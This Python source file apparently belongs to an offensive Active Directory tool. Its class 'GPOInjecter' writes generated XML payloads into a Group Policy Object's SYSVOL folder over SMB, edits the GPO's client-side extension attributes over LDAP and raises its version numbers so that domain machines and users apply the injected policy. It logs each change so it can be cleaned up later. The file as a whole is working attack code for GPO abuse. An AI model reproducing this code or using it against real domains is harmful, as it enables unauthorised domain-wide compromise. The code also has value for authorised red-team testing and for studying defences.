import re
import base64
import chardet
import smbclient

from lxml                               import etree
from smbprotocol.exceptions             import SMBOSError

from gpb.modules.utils.dispatch         import dispatch
from gpb.protocols.ldap                 import get_entry_attribute, modify_attribute
from gpb.protocols.smb                  import write_file_binary
from gpb.utils.encodings                import get_xml_declared_encoding
from gpb.utils.clean                    import clean_save_action

from config                             import bcolors, logger, MODULES_CONFIG

class GPOInjecter():
    def __init__(self,
            domain,
            dc,
            ldap_session,
            gpo_guid,
            modules,
            state_folder):
            
        self.domain = domain
        self.domain_dn = ",".join("DC={}".format(d) for d in domain.split("."))
        self.dc = dc
        self.gpo_guid = gpo_guid
        self.gpo_dn = f"CN={{{self.gpo_guid}}},CN=Policies,CN=System,{self.domain_dn}"
        self.gpo_sysvol_path = fr"\\{self.dc}\SYSVOL\{self.domain}\Policies\{{{self.gpo_guid}}}"
        self.state_folder = state_folder
        self.ldap_session = ldap_session

        logger.warning(f"\n{bcolors.OKCYAN}[#] Generating XML payloads for modules{bcolors.ENDC}")
        self.modules, self.existing_xml = dispatch(modules, state_folder, self.gpo_sysvol_path)

    def run(self) -> None:
        for key, value in self.modules.items():
            for module_name, xml in value.items():
                logger.info(f"\n[INFO] Generated XML for module {module_name} ({key}):")
                logger.info(etree.tostring(etree.fromstring(xml)).decode(get_xml_declared_encoding(xml)))
        logger.warning(f"{bcolors.OKGREEN}[+] Successfully generated XML for all payloads{bcolors.ENDC}")
        self.add_modules()


    def update_extension_names(self, setting_type):
        if setting_type == "computer":
            extensions_attribute = "gPCMachineExtensionNames"
        else:
            extensions_attribute = "gPCUserExtensionNames"

        logger.info(f"[INFO] Starting the update of the '{extensions_attribute}' attribute")
        current_extension_names = str(self.get_current_extension_names(setting_type))
        logger.info(f"[INFO] Current extension names: {current_extension_names}")
        guid_pairs = re.findall(r'\[([^\]]+)\]', current_extension_names)
        extension_names = [re.findall(r'\{([0-9A-Fa-f\-]{36})\}', pair) for pair in guid_pairs]
        for module_name in self.modules[setting_type].keys():
            extension_names = self.generate_extension_names(module_name, extension_names)
        if extension_names is not None:
            extension_names = [''.join(f"{{{guid}}}" for guid in guid_pair) for guid_pair in extension_names]
            extension_names = ''.join(f"[{item}]" for item in extension_names)
            logger.info(f"[INFO] Updated extension names: {extension_names}")
            if extension_names != current_extension_names:
                modify_attribute(self.ldap_session, self.gpo_dn, extensions_attribute, extension_names)
                clean_save_action(self.state_folder, "ldap_modify_attribute", self.gpo_dn, attribute=extensions_attribute, old_value=current_extension_names, new_value=extension_names)
                logger.warning(f"{bcolors.OKGREEN}[+] '{extensions_attribute}' successfully updated{bcolors.ENDC}")
            else:
                logger.warning(f"{bcolors.OKGREEN}[+] Necessary extension names for '{extensions_attribute}' are already present, no need to update{bcolors.ENDC}")


    def get_current_extension_names(self, setting_type: str):
        if setting_type == "computer":
            extensions_attribute = "gPCMachineExtensionNames"
        else:
            extensions_attribute = "gPCUserExtensionNames"
        current_extensionames = get_entry_attribute(self.ldap_session, self.gpo_dn, extensions_attribute)
        return current_extensionames


    def generate_extension_names(self, module_name, extension_names):
        module = MODULES_CONFIG[module_name]

        if module["setting_type"] == "Preferences":
            if "00000000-0000-0000-0000-000000000000" not in [guid_pair[0] for guid_pair in extension_names]:
                extension_names.insert(0, ["00000000-0000-0000-0000-000000000000", module["admin_guid"]])
            else:
                for item in extension_names:
                    if item[0] == "00000000-0000-0000-0000-000000000000":
                        if module["admin_guid"] not in item:
                            item.append(module["admin_guid"])
                        break

        if [module["cse_guid"], module["admin_guid"]] not in extension_names:
            extension_names.append([module["cse_guid"], module["admin_guid"]])
        
        # For whatever reason, extension names actually need to be sorted to be processed correctly (not the case for the GPO core Preferences guids)
        extension_names.sort(key=lambda guid_pair: guid_pair[0])
        return extension_names


    def increase_version(self, version_increase):
        self.increase_version_ldap(version_increase)
        self.increase_version_smb(version_increase)


    def increase_version_ldap(self, version_increase):
        current_version = get_entry_attribute(self.ldap_session, self.gpo_dn, "versionNumber")
        updated_version = current_version + version_increase
        modify_attribute(self.ldap_session, self.gpo_dn, "versionNumber", updated_version)
        clean_save_action(self.state_folder, "ldap_modify_attribute", self.gpo_dn, attribute="versionNumber", old_value=current_version, new_value=updated_version)
        logger.warning(f"{bcolors.OKGREEN}[+] Successfully increased LDAP GPO version{bcolors.ENDC}")


    def increase_version_smb(self, version_increase):
        with smbclient.open_file(fr"{self.gpo_sysvol_path}\GPT.INI", mode="rb") as fd:
            original_gpt_ini_contents = fd.read()
            encoding = chardet.detect(original_gpt_ini_contents)["encoding"]
            gpt_ini_contents = original_gpt_ini_contents.decode(encoding)
            re_match = re.search(r"Version=(\d+)", gpt_ini_contents)
            if re_match:
                current_version = re_match.group(1)
                updated_version = int(current_version) + version_increase

        updated_gpt_ini_contents = re.sub('Version=[0-9]+', 'Version={}'.format(updated_version), gpt_ini_contents)
        write_file_binary(fr"{self.gpo_sysvol_path}\GPT.INI", updated_gpt_ini_contents.encode(encoding))
        clean_save_action(self.state_folder, "smb_modify_file", fr"{self.gpo_sysvol_path}\GPT.INI", old_value=base64.b64encode(original_gpt_ini_contents).decode(), new_value=base64.b64encode(updated_gpt_ini_contents.encode(encoding)).decode())
        logger.warning(f"{bcolors.OKGREEN}[+] Successfully increased SMB GPO version{bcolors.ENDC}")
        

    def add_modules(self) -> None:
        if len(self.modules["computer"].keys()) + len(self.modules["user"].keys()) <= 0:
            return
        
        logger.warning(f"\n{bcolors.OKCYAN}[#] Writing modules XML to the Group Policy Template via SMB{bcolors.ENDC}")
        for module_type, module_list in self.modules.items():
            base_path = fr"{self.gpo_sysvol_path}\User" if module_type == "user" else fr"{self.gpo_sysvol_path}\Machine"
            for module_name, module_xml in module_list.items():
                logger.warning(f"[*] Writing module {module_name} ({module_type})")
                target_path = base_path
                for directory in MODULES_CONFIG[module_name]["gpt_path"].split("\\")[:-1]:
                    try:
                        to_create = f"{target_path}\{directory}"
                        smbclient.mkdir(to_create)
                        logger.info(f"[INFO] Created directory {to_create}")
                        clean_save_action(self.state_folder, "smb_create_directory", to_create)
                    except SMBOSError as e:
                        if e.ntstatus == 0xc0000035:
                            logger.info(f"[INFO] Path {to_create} already exists, skipping")
                            continue
                        else:
                            raise e
                    finally:
                        target_path = to_create
                target_file = f"{base_path}\{MODULES_CONFIG[module_name]['gpt_path']}"
                write_file_binary(target_file, module_xml)
                logger.info(f"[INFO] Wrote XML to file {target_file}")
                if self.existing_xml[module_type][module_name] is None:
                    clean_save_action(self.state_folder, "smb_create_file", target_file)
                else:
                    clean_save_action(self.state_folder, "smb_modify_file", target_file, old_value=base64.b64encode(self.existing_xml[module_type][module_name]).decode(), new_value=base64.b64encode(module_xml).decode())
        
        logger.warning(f"\n{bcolors.OKCYAN}[#] Updating GPO extension names in the Group Policy Container via LDAP{bcolors.ENDC}")
        if len(self.modules["computer"].keys()) > 0:
            self.update_extension_names("computer")
        if len(self.modules["user"].keys()) > 0:
            self.update_extension_names("user")

        logger.warning(f"\n{bcolors.OKCYAN}[#] Increasing the GPO version via LDAP and SMB{bcolors.ENDC}")
        version_increase = 0
        if len(self.modules["computer"].keys()) > 0:
            logger.info("[INFO] Computer GPO version should be increased")
            version_increase += 1
        if len(self.modules["user"].keys()) > 0:
            logger.info("[INFO] User GPO version should be increased")
            version_increase += 65536
        self.increase_version(version_increase)
